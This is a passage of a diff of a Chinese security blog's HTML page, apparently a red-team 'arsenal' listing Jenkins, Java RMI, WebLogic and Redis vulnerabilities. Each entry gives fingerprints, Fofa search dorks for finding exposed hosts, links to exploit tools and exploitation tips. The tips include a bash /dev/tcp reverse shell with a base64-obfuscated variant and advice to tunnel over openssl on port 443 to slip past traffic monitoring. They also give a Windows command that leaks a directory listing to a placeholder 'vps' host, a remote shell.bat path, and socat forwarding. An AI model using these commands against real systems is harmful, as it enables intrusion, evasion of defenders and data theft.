 <p>What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.<br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere</a></p>
@@ -1079,10 +1548,10 @@
 <p><strong>2. 影响组件</strong></p>
 <p>Jenkins</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jenkins</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">Jenkins</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Jenkins"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Jenkins"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Jenkins RCE漏洞分析汇总<br><a href="http://www.lmxspace.com/2019/09/15/Jenkins-RCE漏洞分析汇总/?utm_source=tuicool&amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ" target="_blank" rel="noopener">http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ</a></p>
@@ -1105,10 +1574,12 @@
 <p><strong>2. 影响组件</strong></p>
 <p>java*</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1098, 1099, 1090, 8901, 8902, 8903</span><br><span class="line">N\x00</span><br><span class="line">rmiregistry</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs angelscript"><span class="hljs-number">1098</span>, <span class="hljs-number">1099</span>, <span class="hljs-number">1090</span>, <span class="hljs-number">8901</span>, <span class="hljs-number">8902</span>, <span class="hljs-number">8903</span>
+N\x00
+rmiregistry</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol=="java-rmi"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">protocol</span>==<span class="hljs-string">"java-rmi"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>RMI-反序列化 – 先知社区<br><a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660</a></p>
@@ -1117,7 +1588,7 @@
 <p>Java RMI服务远程命令执行利用_91Ri.org<br><a href="http://www.91ri.org/15276.html" target="_blank" rel="noopener">http://www.91ri.org/15276.html</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.rmi一般在内网开放的比较多, nmap 扫描如下</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v 8.8.8.8 -p1099 -sV --script=rmi*</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs angelscript">nmap -v <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span> -p1099 -sV --script=rmi*</code></pre>
 
 <p><strong>8. 防护方法</strong></p>
 <p>1.设置强口令</p>
@@ -1131,7 +1602,7 @@
 <p>Lcom.tangosol.util.extractor.ReflectionExtractor</p>
 <p>…</p>
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol=="weblogic"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">protocol</span>==<span class="hljs-string">"weblogic"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>相关漏洞有:</p>
@@ -1146,7 +1617,7 @@
 <p>CVE-2020-2555<br><a href="https://github.com/Y4er/CVE-2020-2555" target="_blank" rel="noopener">https://github.com/Y4er/CVE-2020-2555</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.T3 协议通常开放在内网, 外网基本绝迹, 快速检测可以使用nmap</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script=weblogic-t3-info.nse -p 7001</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV --script=weblogic-t3-<span class="hljs-literal">info</span>.nse -p <span class="hljs-number">7001</span></code></pre>
 
 <p>2.内网使用最新的利用链即可, weblogic也支持TLS加密的t3s, 可以使用</p>
 <p>Bort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners.<br><a href="https://github.com/Bort-Millipede/WLT3Serial" target="_blank" rel="noopener">https://github.com/Bort-Millipede/WLT3Serial</a></p>
@@ -1159,10 +1630,12 @@
 <p>WebLogic 10.X</p>
 <p>WebLogic 12.1.3</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType`</span><br><span class="line">`/_async/AsyncResponseService`</span><br><span class="line">`/_async/AsyncResponseServiceSoap12</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs autohotkey">/wls-wsat/CoordinatorPortType`
+`/_async/AsyncResponseService`
+`/_async/AsyncResponseServiceSoap12</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="WebLogic-Server"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"WebLogic-Server"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>（CVE-2017-3506 &amp;CVE-2017-10271）<br>[<a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/]</a>(<a href="http://xxlegend.com/2017/12/23/Weblogic" target="_blank" rel="noopener">http://xxlegend.com/2017/12/23/Weblogic</a> XMLDecoder RCE分析/)</p>
@@ -1170,7 +1643,8 @@
 <p><strong>6. 漏洞利用</strong><br>weblogicScanner<br><a href="https://github.com/0xn0ne/weblogicScanner" target="_blank" rel="noopener">https://github.com/0xn0ne/weblogicScanner</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.由于nginx转发问题, 尝试这种路径, 可能有惊喜</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/../wls-wsat/CoordinatorPortType11`</span><br><span class="line">`/../_async/AsyncResponseService</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs autohotkey">/../wls-wsat/CoordinatorPortType11`
+`/../_async/AsyncResponseService</code></pre>
 
 <p>2.Weblogic 写shell有个技巧</p>
 <p>可以通过<code>find</code>/<code>grep</code>命令查找静态文件的路径, 然后将命令结果输出到静态文件夹中, 比如查找前台的<code>logo.png</code> / <code>/static/css/main.css</code></p>
@@ -1186,10 +1660,10 @@
 <p>12.1.3.0.0</p>
 <p>12.2.1.3.0 and 12.2.1.4.0</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIOP &amp;&amp; com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs css"><span class="hljs-selector-tag">GIOP</span> &amp;&amp; <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.bea</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.repackaged</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.transaction</span><span class="hljs-selector-class">.jta</span><span class="hljs-selector-class">.JtaTransactionManager</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="WebLogic-Server"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"WebLogic-Server"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>WebLogic CVE-2020-2551漏洞分析<br><a href="https://paper.seebug.org/1138/" target="_blank" rel="noopener">https://paper.seebug.org/1138/</a></p>
@@ -1205,10 +1679,10 @@
 <p><strong>2. 影响组件</strong></p>
 <p>Redis</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6379</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs angelscript"><span class="hljs-number">6379</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Redis" &amp;&amp; "redis_version"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Redis"</span> &amp;&amp; <span class="hljs-string">"redis_version"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Redis 基于主从复制的 RCE 利用方式<br><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>
@@ -1229,23 +1703,25 @@
 <p>2.反弹shell 可以使用openssl反弹443端口, 现在厂商一般都有流量监控设备, 直接明文传输会被审查到</p>
 <p>Reverse shell cheatsheet 多种反弹shell的命令<br><a href="https://krober.biz/misc/reverse_shell.php" target="_blank" rel="noopener">https://krober.biz/misc/reverse_shell.php</a></p>
 <p>3.很多时候执行命令不能有特殊符号, 比如尖角号之类的, 可以使用 base64进行传参</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs angelscript">bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">1337</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre>
 
 <p>base64 可以转换成</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs plain">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx</code></pre>
 
 <p>最终可以变成</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c "{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx}|{base64, -d}|{bash, -i}"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs dust"><span class="xml">bash -c "</span><span class="hljs-template-variable">{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx}</span><span class="xml">|</span><span class="hljs-template-variable">{base64, -d}</span><span class="xml">|</span><span class="hljs-template-variable">{bash, -i}</span><span class="xml">"</span></code></pre>
 
 <p>4.windows机器可以使用ie浏览器带数据出来, 很多杀软不会拦截ie浏览器, unc 传输文件也可以</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for /f %s in ('dir c:\ /b') do explorer http://vps:8000/?%s</span><br><span class="line">\\vps\share\shell.bat</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ruby"><span class="hljs-keyword">for</span> /f %s <span class="hljs-keyword">in</span> (<span class="hljs-string">'dir c:\ /b'</span>) <span class="hljs-keyword">do</span> explorer <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/vps:8000/</span><span class="hljs-string">?%</span>s
+\\vps\share\shell.bat</code></pre>
 
 <p>5.针对很多时候java类漏洞, 比如反序列化, rmi, jmx, iiop等情况, 时常会遇到timeout的情况</p>
 <p>这里主要是没有指定<code>hostname</code>, 这里可以使用<code>socat</code>进行流量转发, 无需修改POC, 以<code>CVE-2019-12409</code>为例</p>
 <blockquote>
 <p>这里针对 ENABLE_REMOTE_JMX_OPTS 远程代码执行(CVE-2019-12409) 多说一点, 因为这个问题在所有的jmx连接中都有可能出现<br>这里存在一个问题, JMX Server如果在启动时没有指明hostname, 那么在客户端与服务器交互过程中, 有一步返回 stub rmiserver的过程, 其中地址可能为内网地址<br>通过查看报错, 可以得知内网地址, 例如 172.18.0.2<br>使用如下两条命令即可执行, 替换 <code>[报错中的ip]</code>, <code>[远程目标的ip]</code></p>
 </blockquote>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip addr add [报错中的ip]/24 dev lo</span><br><span class="line">socat tcp4-listen:18983, bind=[报错中的ip], reuseaddr, fork tcp4-connect:[远程目标的ip]:18983</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs armasm"><span class="hljs-symbol">ip</span> <span class="hljs-keyword">addr </span><span class="hljs-keyword">add </span>[报错中的<span class="hljs-built_in">ip</span>]/<span class="hljs-number">24</span> dev lo
+<span class="hljs-symbol">socat</span> tcp4-listen:<span class="hljs-number">18983</span>, <span class="hljs-keyword">bind=[报错中的ip], </span>reuseaddr, fork tcp4-connect:[远程目标的<span class="hljs-built_in">ip</span>]:<span class="hljs-number">18983</span></code></pre>
 
 <p>6.Java 反序列化是这两年的重中之重, 如果有shell出不来可以参考以下链接</p>
 <p>深入理解JAVA反序列化漏洞 | 漏洞盒子 | 互联网安全测试众测平台<br><a href="https://www.vulbox.com/knowledge/detail/?id=11" target="_blank" rel="noopener">https://www.vulbox.com/knowledge/detail/?id=11</a></p>
@@ -1275,173 +1751,253 @@
             });
             document.body.appendChild(img);
           });
-      </script></section>
-    <!-- Tags START -->
+      </script>
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/07/08/asd/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">asd</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/07/08/hello-world/">
+                        <span class="hidden-mobile">hello-world</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
     
-      <div class="tags">
-        <span>Tags:</span>
-        
-  <a href="/tags#漏洞利用" >
-    <span class="tag-code">漏洞利用</span>
-  </a>
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
       </div>
     
-    <!-- Tags END -->
-    <!-- NAV START -->
-    
-  <div class="nav-container">
-    <!-- reverse left and right to put prev and next in a more logic postition -->
-    
-      <a class="nav-left" href="/2020/07/08/hello-world/">
-        <span class="nav-arrow">← </span>
-        
-          hello-world
-        
-      </a>
-    
-    
-      <a class="nav-right" href="/2020/07/08/asd/">
-        
-          asd
-        
-        <span class="nav-arrow"> →</span>
-      </a>
-    
   </div>
-
-    <!-- NAV END -->
-    <!-- 打赏 START -->
-    
-    <!-- 打赏 END -->
-    <!-- 二维码 START -->
-    
-    <!-- 二维码 END -->
-    
-      <!-- No Comment -->
-    
-  </article>
-  <!-- Article END -->
-  <!-- Catalog START -->
-  
-    <aside class="catalog-container">
-  <div class="toc-main">
-    <strong class="toc-title">Catalog</strong>
-    
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Apache-Shiro-RememberMe-反序列化导致的命令执行漏洞-Shiro-550-CVE-2016-4437"><span class="toc-nav-text">Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Apache-Shiro-Padding-Oracle-Attack-Shiro-721"><span class="toc-nav-text">Apache Shiro Padding Oracle Attack (Shiro-721)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Apache-Shiro-权限绕过漏洞-Shiro-682"><span class="toc-nav-text">Apache Shiro 权限绕过漏洞 (Shiro-682)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Fastjson-反序列化远程代码执行漏洞"><span class="toc-nav-text">Fastjson 反序列化远程代码执行漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Jackson-反序列化远程代码执行漏洞"><span class="toc-nav-text">Jackson 反序列化远程代码执行漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Xstream-反序列化漏洞"><span class="toc-nav-text">Xstream 反序列化漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#泛微OA-Bsh-远程代码执行漏洞"><span class="toc-nav-text">泛微OA Bsh 远程代码执行漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#泛微OA-e-cology-SQL注入漏洞"><span class="toc-nav-text">泛微OA e-cology SQL注入漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#泛微OA-数据库泄露漏洞"><span class="toc-nav-text">泛微OA 数据库泄露漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#通达OA-远程代码执行漏洞"><span class="toc-nav-text">通达OA 远程代码执行漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#致远-OA-A8-htmlofficeservlet-getshell-漏洞"><span class="toc-nav-text">致远 OA A8 htmlofficeservlet getshell 漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#致远OA-帆软报表-seeyonreport-远程代码执行"><span class="toc-nav-text">[致远OA] 帆软报表 seeyonreport 远程代码执行</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Smartbi-前台SQL注入"><span class="toc-nav-text">Smartbi 前台SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#深信服VPN远程代码执行"><span class="toc-nav-text">深信服VPN远程代码执行</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#深信服-VPN-口令爆破"><span class="toc-nav-text">深信服 VPN 口令爆破</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Fortigate-SSL-VPN-文件读取-远程代码执行"><span class="toc-nav-text">Fortigate SSL VPN 文件读取&#x2F;远程代码执行</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Pulse-Secure-SSL-VPN远程代码执行漏洞"><span class="toc-nav-text">Pulse Secure SSL VPN远程代码执行漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Palo-Alto-GlobalProtect-VPN远程代码执行漏洞"><span class="toc-nav-text">Palo Alto GlobalProtect VPN远程代码执行漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Citrix-Gateway-ADC-远程代码执行漏洞-CVE-2019-19781"><span class="toc-nav-text">Citrix Gateway&#x2F;ADC 远程代码执行漏洞 (CVE-2019-19781)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#齐治堡垒机相关漏洞"><span class="toc-nav-text">齐治堡垒机相关漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Exchange-相关漏洞"><span class="toc-nav-text">Exchange 相关漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Coremail-相关漏洞"><span class="toc-nav-text">Coremail 相关漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Winmail-相关漏洞"><span class="toc-nav-text">Winmail 相关漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Zabbix-相关漏洞"><span class="toc-nav-text">Zabbix 相关漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#边界产品-防火墙-网关-路由器-VPN-相关漏洞"><span class="toc-nav-text">边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Thinkphp-相关漏洞"><span class="toc-nav-text">Thinkphp 相关漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Spring-系列漏洞"><span class="toc-nav-text">Spring 系列漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Phpstudy-后门远程代码执行"><span class="toc-nav-text">Phpstudy 后门远程代码执行</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Struts-系列漏洞"><span class="toc-nav-text">Struts 系列漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Solr-系列漏洞"><span class="toc-nav-text">Solr 系列漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Tomcat-本地文件包含漏洞-CVE-2020-1938"><span class="toc-nav-text">Tomcat 本地文件包含漏洞 (CVE-2020-1938)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#PHP-FPM-远程代码执行漏洞"><span class="toc-nav-text">PHP-FPM 远程代码执行漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CVE-2019-3396-Confluence-Wiki-远程代码执行"><span class="toc-nav-text">CVE-2019-3396 Confluence Wiki 远程代码执行</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Ghostscript-上传图片代码执行"><span class="toc-nav-text">Ghostscript 上传图片代码执行</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Jboss-相关漏洞"><span class="toc-nav-text">Jboss 相关漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Websphere-反序列化远程代码执行"><span class="toc-nav-text">Websphere 反序列化远程代码执行</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Jenkins-系列漏洞"><span class="toc-nav-text">Jenkins 系列漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#RMI-对外开放"><span class="toc-nav-text">RMI 对外开放</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Weblogic-T3-协议漏洞"><span class="toc-nav-text">Weblogic T3 协议漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Weblogic-XMLDecoder反序列化"><span class="toc-nav-text">Weblogic XMLDecoder反序列化</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Weblogic-IIOP"><span class="toc-nav-text">Weblogic IIOP</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Redis-相关漏洞"><span class="toc-nav-text">Redis 相关漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#后记"><span class="toc-nav-text">后记</span></a></li></ol>
-    
-  </div>
-</aside>
-  
-  <!-- Catalog END -->
-</main>
-
-<script>
-  (function () {
-    var url = 'http://yoursite.com/2020/07/08/斗象科技-武器库/';
-    var banner = ''
-    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
-      $('#article-banner').css({
-        'background-image': 'url(' + banner + ')'
-      })
-    } else {
-      $('#article-banner').geopattern(url)
-    }
-    $('.header').removeClass('fixed-header')
-
-    // error image
-    $(".markdown-content img").on('error', function() {
-      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
-      $(this).css({
-        'cursor': 'default'
-      })
-    })
-
-    // zoom image
-    $(".markdown-content img").on('click', function() {
-      var src = $(this).attr('src')
-      if (src !== 'http://file.muyutech.com/error-img.png') {
-        var imageW = $(this).width()
-        var imageH = $(this).height()
-
-        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
-        zoom = zoom < 1 ? 1 : zoom
-        zoom = zoom > 2 ? 2 : zoom
-        var transY = (($(window).height() - imageH) / 2).toFixed(2)
-
-        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
-        $('.image-view-wrap').addClass('wrap-active')
-        $('.image-view-wrap img').css({
-          'width': `${imageW}`,
-          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
-        })
-        $('html').css('overflow', 'hidden')
-
-        $('.image-view-wrap').on('click', function() {
-          $(this).remove()
-          $('html').attr('style', '')
-        })
-      }
-    })
-  })();
-</script>
-
-
-
-
-
-
-
-    <div class="scroll-top">
-  <span class="arrow-icon"></span>
 </div>
-    <footer class="app-footer">
-  <p class="copyright">
-    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
-    <br>
+
+<!-- Custom -->
+
+
     
-  </p>
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <!-- <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a> -->
+    </div>
+    
+
+    
+
+    
+  </div>
 </footer>
 
-<script>
-  function async(u, c) {
-    var d = document, t = 'script',
-      o = d.createElement(t),
-      s = d.getElementsByTagName(t)[0];
-    o.src = u;
-    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
-    s.parentNode.insertBefore(o, s);
-  }
-</script>
-<script>
-  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
-    FastClick.attach(document.body);
-  })
-</script>
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<script>
-  var hasLine = 'true';
-  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
-    $('figure pre').each(function(i, block) {
-      var figure = $(this).parents('figure');
-      if (hasLine === 'false') {
-        figure.find('.gutter').hide();
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
